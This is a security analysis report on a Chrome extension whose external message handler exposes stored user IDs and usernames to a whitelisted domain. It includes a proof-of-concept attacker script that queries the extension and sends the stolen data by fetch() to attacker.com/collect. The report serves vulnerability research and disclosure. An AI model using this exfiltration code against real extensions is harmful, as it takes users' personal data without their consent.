# CoCo Analysis: decobpbjgkhldmhfgppalipeenloicgn

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (both sendResponseExternal_sink with storage data)

---

## Sink: storage_sync_get_source → sendResponseExternal_sink

**CoCo Trace:**

Detection 1:
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/decobpbjgkhldmhfgppalipeenloicgn/opgen_generated_files/bg.js
Line 727: var storage_sync_get_source = { 'key': 'value' };
Line 972: sendResponse({login:true,user_id:data.userId,userName:data.userName});
```

Detection 2:
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/decobpbjgkhldmhfgppalipeenloicgn/opgen_generated_files/bg.js
Line 727: var storage_sync_get_source = { 'key': 'value' };
Line 971: if (data.login && data.userId) {
```

**Code:**

```javascript
// Background script - External message handler (line 968-978)
chrome.runtime.onMessageExternal.addListener(function(request, sender, sendResponse) {
    if (request.checkLogin) { // ← attacker-controlled request
        chrome.storage.sync.get(null, function(data) { // ← reads all stored data
            if (data.login && data.userId) {
                sendResponse({
                    login: true,
                    user_id: data.userId,      // ← sensitive data sent to attacker
                    userName: data.userName    // ← sensitive data sent to attacker
                });
            }
            else {
                sendResponse({login: false});
            }
        });
    }
    // ... other handlers
});

// Storage write happens during OAuth flow (line 1788)
// userId and userName are stored from Google OAuth and backend API
chrome.storage.sync.set({
    login: resp.email,
    loginTime: time_now,
    userId: resp1.data.id,
    userName: resp1.data.name
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message from whitelisted domain

**Attack:**

```javascript
// Attacker code (must run on https://byeextension.com/*)
// The manifest specifies externally_connectable: "https://byeextension.com/*"

// Extension ID for this extension
const extensionId = "decobpbjgkhldmhfgppalipeenloicgn";

// Request login information
chrome.runtime.sendMessage(
    extensionId,
    { checkLogin: true },
    function(response) {
        if (response && response.login) {
            console.log("Stolen user ID:", response.user_id);
            console.log("Stolen username:", response.userName);

            // Exfiltrate to attacker server
            fetch("https://attacker.com/collect", {
                method: "POST",
                body: JSON.stringify({
                    userId: response.user_id,
                    userName: response.userName
                })
            });
        }
    }
);
```

**Impact:** Information disclosure vulnerability. An attacker with control over the whitelisted domain (byeextension.com) or an XSS vulnerability on that domain can exfiltrate sensitive user information (user ID and username) from the extension's storage. While the manifest restricts external messages to byeextension.com only, per the analysis methodology, if even ONE domain can exploit it, this qualifies as a TRUE POSITIVE. The extension unnecessarily exposes user data through the external message interface without proper validation or security controls.
